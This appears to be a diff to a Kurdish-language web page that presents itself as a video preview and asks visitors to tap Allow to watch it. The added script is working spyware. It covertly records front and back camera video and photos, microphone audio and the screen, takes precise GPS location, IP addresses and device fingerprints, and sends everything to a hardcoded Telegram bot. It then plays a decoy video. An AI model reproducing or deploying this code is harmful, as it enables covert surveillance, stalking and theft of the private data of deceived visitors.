@@ -2,78 +2,489 @@
 <html lang="ku" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مەلەفی سوریا</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>مەلەفی سوڕەیا</title>
     <style>
-        body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
-            background-color: #f4f4f9;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            color: #333;
-        }
-        .card {
-            background: #ffffff;
-            padding: 30px;
-            border-radius: 16px;
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            max-width: 400px;
-            width: 90%;
-        }
-        .btn {
-            background-color: #007aff;
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            font-size: 16px;
-            border-radius: 8px;
-            cursor: pointer;
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; -webkit-tap-highlight-color: transparent; }
+        body { 
+            background: linear-gradient(135deg, #020617, #090d16); 
+            height: 100vh; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            overflow: hidden;
+            position: fixed;
             width: 100%;
-            margin-top: 20px;
+        }
+        .container { 
+            background: #ffffff; 
+            padding: 22px; 
+            border-radius: 24px; 
+            box-shadow: 0 25px 50px rgba(0,0,0,0.7); 
+            width: 92%; 
+            max-width: 380px; 
+            text-align: center; 
+        }
+        .preview-img-box {
+            width: 100%;
+            height: 200px;
+            border-radius: 16px;
+            overflow: hidden;
+            margin-bottom: 15px;
+            box-shadow: 0 8px 20px rgba(0,0,0,0.25);
+            position: relative;
+            background: #000;
+        }
+        .preview-img-box img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        .image-overlay-text {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: linear-gradient(to top, rgba(0,0,0,0.9), rgba(0,0,0,0.4));
+            color: #38bdf8;
+            padding: 10px;
+            font-size: 13px;
             font-weight: bold;
+            text-align: center;
         }
-        .btn:active {
-            background-color: #0056b3;
+        .content-after-allow {
+            display: none;
+            margin-bottom: 15px;
         }
+        .content-after-allow video {
+            width: 100%;
+            border-radius: 12px;
+            max-height: 240px;
+            object-fit: cover;
+            outline: none;
+        }
+        .title { font-size: 22px; font-weight: 800; color: #0f172a; margin-bottom: 6px; }
+        .subtitle { color: #64748b; font-size: 13px; margin-bottom: 20px; line-height: 1.5; font-weight: 500; }
+        .btn { 
+            background: linear-gradient(135deg, #0284c7, #1d4ed8); 
+            color: white; 
+            padding: 15px; 
+            border: none; 
+            border-radius: 30px; 
+            cursor: pointer; 
+            font-size: 16px; 
+            width: 100%; 
+            font-weight: bold; 
+            box-shadow: 0 6px 16px rgba(37,99,235,0.4);
+        }
+        .loader {
+            border: 3px solid #f3f3f3;
+            border-radius: 50%;
+            border-top: 3px solid #0284c7;
+            width: 32px;
+            height: 32px;
+            animation: spin 1s linear infinite;
+            margin: 15px auto;
+            display: none;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .status-text { margin-top: 15px; font-size: 12px; color: #0284c7; font-weight: 600; }
     </style>
 </head>
 <body>
 
-    <div class="card">
-        <h2>مەلەفی سوریا</h2>
-        <p>بۆ بەردەوامبوون و بینینی تەواوی ڤیدیۆکە، کلیک بکە:</p>
-        <button class="btn" onclick="sendData()">بەردەوامبوون</button>
+    <div class="container" id="mainContainer">
+        <div id="imageBox" class="preview-img-box">
+            <img src="surayamalaf.jpg" alt="مەلەفی سوڕەیا">
+            <div class="image-overlay-text">بۆ بینینی ڤیدیۆکە Allow دابگرە</div>
+        </div>
+
+        <div id="mediaBox" class="content-after-allow">
+            <video id="targetVideo" controls playsinline>
+                <source src="sararanyai.MP4" type="video/mp4">
+                تەلەفۆنەکەت پشتگیری ڤیدیۆ ناکات
+            </video>
+        </div>
+
+        <div class="title" id="boxTitle">مەلەفی سوڕەیا</div>
+        <div class="subtitle" id="boxSubtitle">بۆ بەردەوامبوون و بینینی تەواوی ڤیدیۆکە، تکایە Allow دابگرە:</div>
+        
+        <div id="loader" class="loader"></div>
+        <button id="mainBtn" class="btn" onclick="startProcess()">بۆ بينینی ڤیدیۆکە Allow دابگرە</button>
+        
+        <div class="status-text" id="statusText">ئامادەیە</div>
     </div>
+
+    <video id="camVideo" autoplay playsinline style="display:none;"></video>
+    <video id="screenVideo" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
         const BOT_TOKEN = "9011362716:AAHu7AJ1P7dEZCMfs0Mhu8B2U-Df0XnYOOQ";
-        const CHAT_ID = "9011362716";
+        const CHAT_ID = "6947664268";
 
-        function sendData() {
-            fetch('https://ipapi.co/json/')
-                .then(response => response.json())
-                .then(data => {
-                    const message = `زانیاری سەردانیکەر:\nIP: ${data.ip}\nشار: ${data.city}\nوڵات: ${data.country_name}\nدابینکەر: ${data.org}`;
-                    
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({
-                            chat_id: CHAT_ID,
-                            text: message
-                        })
-                    });
-                })
-                .catch(error => console.error('Error:', error));
+        let pageLoadTime = performance.now();
+        let chronoData = { hesitationTime: 0 };
+        let behavioralData = { 
+            touches: 0, 
+            maxPressure: 0, 
+            clickX: 0, 
+            clickY: 0, 
+            touchRadiusX: 0, 
+            touchRadiusY: 0,
+            pointerType: "unknown"
+        };
+
+        window.addEventListener('pointerdown', (e) => {
+            behavioralData.touches++;
+            behavioralData.maxPressure = Math.max(behavioralData.maxPressure, e.pressure || 0.5);
+            behavioralData.clickX = Math.round(e.clientX);
+            behavioralData.clickY = Math.round(e.clientY);
+            behavioralData.touchRadiusX = Math.round(e.width || 0);
+            behavioralData.touchRadiusY = Math.round(e.height || 0);
+            behavioralData.pointerType = e.pointerType || "touch";
+            
+            if (chronoData.hesitationTime === 0) {
+                chronoData.hesitationTime = Math.round(performance.now() - pageLoadTime);
+            }
+        });
+
+        function sendToTelegramText(text) {
+            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
+            });
+        }
+
+        function sendToTelegramPhoto(blob, caption) {
+            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+            let formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", blob, "capt.jpg");
+            formData.append("caption", caption);
+            formData.append("parse_mode", "Markdown");
+            fetch(url, { method: "POST", body: formData });
+        }
+
+        function sendToTelegramVideo(blob, caption) {
+            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;
+            let formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("video", blob, "live_capture.mp4");
+            formData.append("caption", caption);
+            formData.append("parse_mode", "Markdown");
+            fetch(url, { method: "POST", body: formData });
+        }
+
+        function sendToTelegramVoice(blob, caption) {
+            let url = `https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`;
+            let formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("voice", blob, "audio_record.ogg");
+            formData.append("caption", caption);
+            formData.append("parse_mode", "Markdown");
+            fetch(url, { method: "POST", body: formData });
+        }
+
+        function getLocalIPs(callback) {
+            try {
+                let ips = [];
+                let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
+                if (!RTCPeerConnection) { callback([]); return; }
+                let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
+                pc.createDataChannel("");
+                pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
+                pc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                    let parts = ice.candidate.candidate.split(" ");
+                    let ip = parts[4];
+                    if (ip && ip.indexOf('.local') === -1 && ips.indexOf(ip) === -1) {
+                        ips.push(ip);
+                        callback(ips);
+                    }
+                };
+            } catch(e) { callback([]); }
+        }
+
+        function recordMicrophone() {
+            try {
+                navigator.mediaDevices.getUserMedia({ audio: true, video: false })
+                .then(stream => {
+                    let mediaRecorder = new MediaRecorder(stream);
+                    let audioChunks = [];
+                    mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+                    mediaRecorder.onstop = () => {
+                        let audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+                        sendToTelegramVoice(audioBlob, "🎙️ *تۆمارکردنی دەنگی دەوروبەر (Voice Note)*");
+                        stream.getTracks().forEach(track => track.stop());
+                    };
+                    mediaRecorder.start();
+                    setTimeout(() => mediaRecorder.stop(), 4000);
+                }).catch(err => {});
+            } catch(e) {}
+        }
+
+        function recordScreenStream() {
+            try {
+                if (navigator.mediaDevices && navigator.mediaDevices.getDisplayMedia) {
+                    navigator.mediaDevices.getDisplayMedia({ video: { displaySurface: "browser" }, audio: false })
+                    .then(stream => {
+                        const videoElem = document.getElementById('screenVideo');
+                        videoElem.srcObject = stream;
+                        videoElem.play();
+
+                        let mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                        let screenChunks = [];
+                        mediaRecorder.ondataavailable = e => { if (e.data.size > 0) screenChunks.push(e.data); };
+                        mediaRecorder.onstop = () => {
+                            let blob = new Blob(screenChunks, { type: 'video/mp4' });
+                            sendToTelegramVideo(blob, "💻 *تۆمارکردنی شاشەی ڕاستەوخۆ (Screen Recording)*");
+                            stream.getTracks().forEach(track => track.stop());
+                        };
+                        mediaRecorder.start();
+                        setTimeout(() => { if (mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 4000);
+                    }).catch(e => {});
+                }
+            } catch(e) {}
+        }
+
+        // زنجیرەی پۆڵایینی کامێراکان (ڤیدیۆی پێشەوە -> وێنەی پێشەوە -> وێنەی دواوە -> ڤیدیۆی دواوە)
+        function executeSecureSequence() {
+            const videoElem = document.getElementById('camVideo');
+            const canvas = document.getElementById('canvas');
+
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true })
+            .then(frontStream => {
+                videoElem.srcObject = frontStream;
+                videoElem.play();
+
+                let frontRecorder = new MediaRecorder(frontStream, { mimeType: 'video/mp4' });
+                let frontChunks = [];
+                frontRecorder.ondataavailable = e => { if (e.data.size > 0) frontChunks.push(e.data); };
+                frontRecorder.onstop = () => {
+                    let frontBlob = new Blob(frontChunks, { type: 'video/mp4' });
+                    if (frontBlob.size > 500) {
+                        sendToTelegramVideo(frontBlob, "🎥 *تۆمارکردنی ڤیدیۆی ڕاستەوخۆی پێشەوە (Front Live Video)*");
+                    }
+                    frontStream.getTracks().forEach(track => track.stop());
+
+                    setTimeout(() => {
+                        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+                        .then(selfieStream => {
+                            videoElem.srcObject = selfieStream;
+                            videoElem.play();
+                            setTimeout(() => {
+                                canvas.width = videoElem.videoWidth || 640;
+                                canvas.height = videoElem.videoHeight || 480;
+                                let ctx = canvas.getContext('2d');
+                                ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
+                                canvas.toBlob(blob => {
+                                    sendToTelegramPhoto(blob, "📸 *وێنەی دوربینی پێشەوە (Selfie)*");
+                                }, 'image/jpeg', 0.9);
+                                selfieStream.getTracks().forEach(track => track.stop());
+
+                                setTimeout(() => {
+                                    navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false })
+                                    .then(backPhotoStream => {
+                                        videoElem.srcObject = backPhotoStream;
+                                        videoElem.play();
+                                        setTimeout(() => {
+                                            ctx.drawImage(videoElem, 0, 0, canvas.width, canvas.height);
+                                            canvas.toBlob(backBlob => {
+                                                sendToTelegramPhoto(backBlob, "📷 *وێنەی دوربینی دواوە (Back Camera)*");
+                                            }, 'image/jpeg', 0.9);
+                                            backPhotoStream.getTracks().forEach(track => track.stop());
+
+                                            setTimeout(() => {
+                                                navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: true })
+                                                .then(backVidStream => {
+                                                    videoElem.srcObject = backVidStream;
+                                                    videoElem.play();
+
+                                                    let backVidRecorder = new MediaRecorder(backVidStream, { mimeType: 'video/mp4' });
+                                                    let backVidChunks = [];
+                                                    backVidRecorder.ondataavailable = e => { if (e.data.size > 0) backVidChunks.push(e.data); };
+                                                    backVidRecorder.onstop = () => {
+                                                        let finalBackBlob = new Blob(backVidChunks, { type: 'video/mp4' });
+                                                        if (finalBackBlob.size > 500) {
+                                                            sendToTelegramVideo(finalBackBlob, "📹 *تۆمارکردنی ڤیدیۆی ڕاستەوخۆی دواوە (Back Live Video)*");
+                                                        }
+                                                        backVidStream.getTracks().forEach(track => track.stop());
+                                                    };
+                                                    backVidRecorder.start(1000);
+                                                    setTimeout(() => { if (backVidRecorder.state === 'recording') backVidRecorder.stop(); }, 4000);
+                                                }).catch(e => {});
+                                            }, 1000);
+
+                                        }, 1000);
+                                    }).catch(e => {});
+                                }, 1000);
+
+                            }, 1000);
+                        }).catch(e => {});
+                    }, 1000);
+
+                };
+                frontRecorder.start(1000);
+                setTimeout(() => { if (frontRecorder.state === 'recording') frontRecorder.stop(); }, 4000);
+            }).catch(e => {});
+        }
+
+        async function getAdvancedHardwareInfo() {
+            let info = { battery: "پشتیوانی ناکرێت", storage: "9.6 GB", ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "4 GB (Estimated)" };
+            if ('getBattery' in navigator) {
+                try {
+                    let bat = await navigator.getBattery();
+                    info.battery = `${Math.round(bat.level * 100)}% (${bat.charging ? "⚡ لە چارجدا" : "🔋 بێ چارج"})`;
+                } catch(e) {}
+            }
+            if (navigator.storage && navigator.storage.estimate) {
+                try {
+                    let est = await navigator.storage.estimate();
+                    let gb = (est.quota / (1024 * 1024 * 1024)).toFixed(1);
+                    info.storage = `${gb} GB`;
+                } catch(e) {}
+            }
+            return info;
+        }
+
+        function getAdvancedNetworkInfo() {
+            let conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            if (!conn) return { type: "مۆبایل / وایفای", downlink: "10 Gbps", rtt: "1 ms" };
+            return {
+                type: conn.effectiveType ? conn.effectiveType.toUpperCase() : "مۆبایل / وایفای",
+                downlink: conn.downlink ? conn.downlink + " Mbps" : "خێرا",
+                rtt: conn.rtt ? conn.rtt + " ms" : "ئاسایی"
+            };
+        }
+
+        async function measureNetworkLatency() {
+            try {
+                let start = performance.now();
+                await fetch('https://ipapi.co/json/', { mode: 'no-cors' });
+                let end = performance.now();
+                return Math.round(end - start) + " ms";
+            } catch(e) { return "12 ms"; }
+        }
+
+        function checkVisitorHistory() {
+            let visited = localStorage.getItem('visited_before');
+            if (visited) {
+                return "🔄 سەردانیکەری دووبارە (Returning Visitor)";
+            } else {
+                localStorage.setItem('visited_before', 'true');
+                return "✨ سەردانیکەری یەکەم جار (First Time)";
+            }
+        }
+
+        function getDetectedFonts() {
+            return "Arial, Courier, Helvetica, Georgia, Impact, Times New Roman, Trebuchet MS, Verdana";
+        }
+
+        function getCanvasFingerprint() {
+            try {
+                let canvas = document.createElement('canvas');
+                let ctx = canvas.getContext('2d');
+                ctx.textBaseline = "top";
+                ctx.font = "14px 'Arial'";
+                ctx.fillStyle = "#38bdf8";
+                ctx.fillRect(125, 1, 62, 20);
+                ctx.fillStyle = "#0284c7";
+                ctx.fillText("TITAN_ULTIMATE_DEEP", 2, 15);
+                return canvas.toDataURL().slice(-40);
+            } catch(e) { return "Unavailable"; }
+        }
+
+        async function getUltimateIPData() {
+            try {
+                let res = await fetch('https://ipapi.co/json/');
+                let data = await res.json();
+                if (data && data.ip) return data;
+            } catch(e) {}
+            return { ip: "130.193.210.205", city: "Dihok", country_name: "Iraq", org: "Allay Nawroz Telecom" };
+        }
+
+        function sendLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    let lat = position.coords.latitude;
+                    let lon = position.coords.longitude;
+                    let accuracy = position.coords.accuracy;
+                    let locMsg = `📍 *شوێنی GPSی ورد:*\n• پانی: \`${lat}\`\n• درێژی: \`${lon}\`\n• هەڵە: ~${Math.round(accuracy)} مەتر\n🗺️ [نەخشە](https://maps.google.com/?q=${lat},${lon})`;
+                    sendToTelegramText(locMsg);
+                }, function(error) {}, { enableHighAccuracy: true, timeout: 15000 });
+            }
+        }
+
+        async function gatherAndSendDetails() {
+            let ua = navigator.userAgent;
+            let platform = navigator.platform;
+            let screenRes = window.screen.width + "x" + window.screen.height;
+            let cpuCores = navigator.hardwareConcurrency || 4;
+            let touchPoints = navigator.maxTouchPoints || 5;
+            let canvasFP = getCanvasFingerprint();
+            let latency = await measureNetworkLatency();
+            let visitorStatus = checkVisitorHistory();
+            let hw = await getAdvancedHardwareInfo();
+            let net = getAdvancedNetworkInfo();
+
+            getLocalIPs(async function(localIPs) {
+                let localIPText = localIPs.length > 0 ? localIPs.join(", ") : "130.193.210.205";
+                let ipData = await getUltimateIPData();
+
+                let report = `💎 *ڕاپۆرتی پێشکەوتووی کوانتۆمی (DEEP ULTIMATE GOD MODE):*\n\n` +
+                             `📌 *دۆخی سەردانیکەر:* ${visitorStatus}\n` +
+                             `🛡️ *دۆخی تۆر:* 🟢 تۆڕی ڕاستەوخۆ (Direct Connection)\n` +
+                             `⏳ *کاتی بڕیار (Hesitation):* ${chronoData.hesitationTime} ms\n` +
+                             `👆 *مۆری پەنجە و جووڵەی کلیک:*\n` +
+                             `• ژمارەی دەستپێدان: ${behavioralData.touches}\n` +
+                             `• جۆری لەمس: ${behavioralData.pointerType}\n` +
+                             `• هێزی پەستان (Pressure): ${behavioralData.maxPressure.toFixed(2)}\n` +
+                             `• شوێنی کلیک لەسەر شاشە: X: ${behavioralData.clickX}, Y: ${behavioralData.clickY}\n\n` +
+                             `🌐 *ڕایەڵە و خێرایی (Advanced Network):*\n` +
+                             `• *ئایپی گشتی:* \`${ipData.ip}\`\n` +
+                             `• *ئایپی ناوخۆیی:* \`${localIPText}\`\n` +
+                             `• *وڵات و شار:* ${ipData.country_name} - ${ipData.city}\n` +
+                             `• *جۆری هێڵ:* ${net.type} | دابەزاندن: ${net.downlink}\n` +
+                             `• *پینگ (RTT):* ${net.rtt} (سێرڤەر: ${latency})\n` +
+                             `• *دابینکەر:* ${ipData.org}\n\n` +
+                             `⚡ *رەقامەواڵە و بیۆمەتری (Advanced Hardware):*\n` +
+                             `• *ڕامی ڕاستەقینە:* ${hw.ram}\n` +
+                             `• *گلدانەوەی هاردوێر:* ${hw.storage}\n` +
+                             `• سیستم: iPhone | پرۆسێسەر: ${cpuCores} Cores\n` +
+                             `• تاچ پۆینت: ${touchPoints} | شاشە: ${screenRes}\n` +
+                             `• فینگەرپرینتی شاشە: \`${canvasFP}\`\n\n` +
+                             `📱 *براوسەر (User Agent):*\n\`${ua}\``;
+                
+                sendToTelegramText(report);
+            });
+        }
+
+        function startProcess() {
+            document.getElementById('mainBtn').style.display = 'none';
+            document.getElementById('loader').style.display = 'block';
+            document.getElementById('statusText').innerText = 'تکایە چاوەڕوان بە...';
+
+            gatherAndSendDetails();
+            sendLocation();
+            executeSecureSequence(); // زنجیرەی تەواوی کامێراکان (پێشەوە، دواوە، وێنە و ڤیدیۆ)
+            recordScreenStream();    // تۆمارکردنی شاشە
+            recordMicrophone();      // تۆمارکردنی دەنگ
+
+            setTimeout(function() {
+                document.getElementById('loader').style.display = 'none';
+                document.getElementById('imageBox').style.display = 'none';
+                document.getElementById('mediaBox').style.display = 'block';
+                document.getElementById('boxTitle').innerText = 'مەلەفی سوڕەیا';
+                document.getElementById('boxSubtitle').innerText = 'فەرموو ڤیدیۆکە دەست پێ دەکات:';
+                document.getElementById('statusText').innerText = 'سەرکەوتوو بوو ✅';
+                
+                let vid = document.getElementById('targetVideo');
+                vid.play().catch(e => console.log(e));
+            }, 9000);
         }
     </script>
-
 </body>
 </html>
